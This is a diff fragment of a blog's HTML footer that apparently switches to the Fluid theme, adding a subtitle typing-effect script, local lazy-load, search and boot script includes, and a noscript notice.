+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
